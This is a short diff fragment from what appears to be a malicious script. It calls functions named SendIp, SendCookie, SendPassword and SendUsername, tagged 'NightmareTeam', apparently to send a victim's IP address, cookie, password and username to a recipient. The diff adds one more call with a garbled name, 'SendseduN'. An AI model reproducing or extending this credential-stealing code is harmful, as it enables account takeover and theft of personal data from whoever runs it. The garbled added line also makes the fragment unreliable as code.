@@ -8,5 +8,6 @@ SendIp(from, LP, to, "NightmareTeam")
 SendCookie(from, LP, to, "NightmareTeam")
 SendPassword(from, LP, to, "NightmareTeam")
 SendUsername(from, LP, to, "NightmareTeam")
+SendseduN(from, LP, to, "NightmareTeam")
 
 ]]
